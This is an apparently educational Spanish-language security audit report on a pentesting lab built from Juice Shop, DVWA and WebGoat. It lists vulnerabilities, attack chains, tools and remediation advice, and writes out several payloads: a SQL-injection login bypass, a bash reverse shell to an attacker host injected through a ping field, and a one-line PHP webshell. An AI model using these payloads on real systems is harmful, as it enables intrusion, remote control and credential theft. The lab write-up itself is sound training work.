# Informe Final - Auditoría de Seguridad del Laboratorio de Pentesting

**Fecha de Auditoría:** 17-18 de Diciembre de 2025  
**Auditor:** Consultor de Seguridad  
**Alcance:** Entorno de Laboratorio Completo (Juice Shop, DVWA, WebGoat)  
**Metodología:** OWASP Testing Guide v4

---

## 1. Resumen Ejecutivo

Se ha realizado una auditoría de seguridad exhaustiva sobre un entorno de laboratorio de pentesting compuesto por tres aplicaciones web intencionalmente vulnerables. El objetivo fue identificar, explotar y documentar vulnerabilidades críticas para fines educativos.

### Hallazgos Globales

| Métrica | Valor |
|---------|-------|
| **Aplicaciones Auditadas** | 3 |
| **Vulnerabilidades Críticas** | 5 |
| **Vulnerabilidades Altas** | 6 |
| **Vulnerabilidades Medias** | 1 |
| **Vulnerabilidades Bajas** | 1 |
| **Total de Vulnerabilidades** | 13 |

### Nivel de Riesgo Global: **CRÍTICO** 🔴

---

## 2. Aplicaciones Auditadas

### 2.1 OWASP Juice Shop (http://localhost:3000)
- **Tecnología:** Node.js/Express
- **Vulnerabilidades Encontradas:** 8
- **Nivel de Riesgo:** CRÍTICO

### 2.2 DVWA (http://localhost:8081)
- **Tecnología:** PHP/Apache
- **Vulnerabilidades Encontradas:** 7 (nivel Low)
- **Nivel de Riesgo:** CRÍTICO

### 2.3 WebGoat (http://localhost:8080)
- **Tecnología:** Java/Tomcat
- **Estado:** Identificado, pendiente de auditoría completa
- **Nivel de Riesgo:** Por determinar

---

## 3. Vulnerabilidades Críticas (Top 5)

### 🔴 CRIT-01: Inyección SQL (SQLi) - Juice Shop
- **CVSS Score:** 9.8 (Critical)
- **Impacto:** Bypass completo de autenticación, acceso como administrador
- **Payload:** `' or 1=1--`
- **Evidencia:** Acceso exitoso a cuenta `admin@juice-sh.op`

### 🔴 CRIT-02: Command Injection (RCE) - DVWA
- **CVSS Score:** 9.8 (Critical)
- **Impacto:** Ejecución remota de comandos, reverse shell obtenida
- **Payload:** `127.0.0.1; /bin/bash -c 'bash -i >& /dev/tcp/kali-attacker/4444 0>&1'`
- **Evidencia:** Shell como usuario `www-data`

### 🔴 CRIT-03: Sensitive Data Exposure - Juice Shop
- **CVSS Score:** 9.1 (Critical)
- **Impacto:** Exfiltración de base de datos KeePass con credenciales
- **Vector:** Directory Listing + Null Byte Injection
- **Evidencia:** Descarga de `incident-support.kdbx`

### 🔴 CRIT-04: Unrestricted File Upload - DVWA
- **CVSS Score:** 9.8 (Critical)
- **Impacto:** Webshell PHP subida, ejecución remota de código
- **Payload:** `<?php system($_REQUEST['cmd']); ?>`
- **Evidencia:** RCE confirmada vía `simple-backdoor.php`

### 🔴 CRIT-05: Broken Access Control - Juice Shop
- **CVSS Score:** 8.6 (High)
- **Impacto:** Bypass de restricciones de descarga de archivos
- **Técnica:** Null Byte Injection (`%2500.md`)
- **Evidencia:** Descarga de archivos `.kdbx` y `.yml` restringidos

---

## 4. Resumen por Aplicación

### 📊 Juice Shop - 8 Vulnerabilidades

| ID | Vulnerabilidad | Severidad | OWASP Top 10 |
|----|----------------|-----------|--------------|
| VULN-01 | SQL Injection | Crítica | A03:2021 – Injection |
| VULN-02 | Reflected XSS | Alta | A03:2021 – Injection |
| VULN-03 | Session Hijacking | Alta | A07:2021 – Identification Failures |
| VULN-04 | Broken Access Control | Crítica | A01:2021 – Broken Access Control |
| VULN-05 | Security Misconfiguration | Media | A05:2021 – Security Misconfiguration |
| VULN-06 | Improper Error Handling | Baja | A05:2021 – Security Misconfiguration |
| VULN-07 | DOM-based XSS | Alta | A03:2021 – Injection |
| VULN-08 | Sensitive Data Exposure | Crítica | A02:2021 – Cryptographic Failures |

### 📊 DVWA - 7 Vulnerabilidades

| ID | Vulnerabilidad | Severidad | OWASP Top 10 |
|----|----------------|-----------|--------------|
| DVWA-01 | Command Injection (RCE) | Crítica | A03:2021 – Injection |
| DVWA-02 | SQL Injection | Crítica | A03:2021 – Injection |
| DVWA-03 | File Upload (Webshell) | Crítica | A04:2021 – Insecure Design |
| DVWA-04 | XSS Stored | Alta | A03:2021 – Injection |
| DVWA-05 | Weak Credentials | Alta | A07:2021 – Identification Failures |
| DVWA-06 | Local File Inclusion | Alta | A01:2021 – Broken Access Control |
| DVWA-07 | CSRF | Media | A01:2021 – Broken Access Control |

---

## 5. Análisis de Infraestructura (Nmap)

### Escaneo de Red Completo
- **Red:** 172.19.0.0/16 (red-pentesting-aislada)
- **Hosts Activos:** 4 (WebGoat, Juice Shop, DVWA, Kali)
- **Puertos Abiertos Totales:** 4

### Hallazgos de Configuración

#### WebGoat (172.19.0.2)
- ✅ Puertos 8080, 9080 (Apache Tomcat)
- 🐧 Linux 4.15 - 5.19

#### Juice Shop (172.19.0.3)
- ✅ Puerto 3000 (Node.js/Express)
- ⚠️ CORS permisivo (`Access-Control-Allow-Origin: *`)
- 🎁 Easter Egg: `X-Recruiting: /#/jobs`

#### DVWA (172.19.0.4)
- ✅ Puerto 80 (Apache 2.4.25)
- 🚨 Cookie PHPSESSID sin flag `HttpOnly`
- 🚨 robots.txt expuesto

---

## 6. Cadenas de Ataque Documentadas

### 🔗 Cadena 1: SQLi → Admin Access → XSS → Session Hijacking
1. Bypass de login con `' or 1=1--`
2. Acceso como administrador
3. Inyección de XSS en búsqueda
4. Robo de cookies de otros usuarios

### 🔗 Cadena 2: Directory Listing → Null Byte → Data Exfiltration
1. Descubrimiento de `/ftp` con `gobuster`
2. Bypass de filtro con `%2500.md`
3. Descarga de `incident-support.kdbx`
4. (Potencial) Crackeo de KeePass con John the Ripper

### 🔗 Cadena 3: Command Injection → Reverse Shell → Persistence
1. Inyección en campo de ping
2. Payload de reverse shell en bash
3. Conexión establecida como `www-data`
4. (Potencial) Escalada de privilegios

---

## 7. Herramientas Utilizadas

| Herramienta | Propósito | Versión |
|-------------|-----------|---------|
| Nmap | Escaneo de red y puertos | 7.95 |
| Gobuster | Fuzzing de directorios | - |
| SQLMap | Explotación de SQLi | - |
| Hydra | Fuerza bruta de credenciales | - |
| Netcat | Reverse shell listener | - |
| Burp Suite / DevTools | Interceptación HTTP | - |

---

## 8. Recomendaciones Generales

### Prioridad CRÍTICA
1. ✅ Implementar **Prepared Statements** para todas las consultas SQL
2. ✅ Validar y sanitizar **todas** las entradas de usuario
3. ✅ Deshabilitar **Directory Listing** en servidores web
4. ✅ Implementar **validación de tipo de archivo** en uploads
5. ✅ Configurar flags **HttpOnly** y **Secure** en cookies

### Prioridad ALTA
6. ✅ Implementar **Content Security Policy (CSP)**
7. ✅ Restringir **CORS** a orígenes específicos
8. ✅ Añadir **tokens Anti-CSRF** en formularios críticos
9. ✅ Implementar **Rate Limiting** contra fuerza bruta
10. ✅ Ocultar **versiones de software** en headers HTTP

### Prioridad MEDIA
11. ✅ Implementar **manejo global de errores**
12. ✅ Actualizar software a **últimas versiones**
13. ✅ Implementar **logging y monitoreo** de seguridad

---

## 9. Conclusión

El entorno de laboratorio cumple su propósito educativo al exponer múltiples vulnerabilidades críticas del **OWASP Top 10**. Las aplicaciones auditadas presentan fallos fundamentales en:

- **Validación de entrada** (Injection)
- **Autenticación y autorización** (Broken Access Control)
- **Configuración de seguridad** (Security Misconfiguration)
- **Protección de datos sensibles** (Sensitive Data Exposure)

**Estado del Laboratorio:** 🟢 **Operativo y Persistente**  
**Documentación:** ✅ **Completa**  
**Nivel Educativo:** ⭐⭐⭐⭐⭐ **Excelente**

---

## 10. Anexos

### Documentación Técnica Detallada
- `Labs/Laboratorio-Pentesting-01.md` - Juice Shop (8 vulnerabilidades)
- `Labs/Laboratorio-DVWA.md` - DVWA (7 vulnerabilidades)
- `Labs/Reporte-Ejecutivo-Pentest-Lab01.md` - Reporte ejecutivo Juice Shop
- `Labs/Reporte-Ejecutivo-Pentest-DVWA.md` - Reporte ejecutivo DVWA
- `Labs/Escaneo-Nmap-Red-Completa.md` - Análisis de infraestructura

### Configuración del Entorno
- `docker-compose.yml` - Orquestación de contenedores
- `README.md` - Guía de uso del laboratorio

---

**Firma Digital:** Consultor de Seguridad  
**Fecha:** 18 de Diciembre de 2025  
**Clasificación:** EDUCATIVO - USO INTERNO
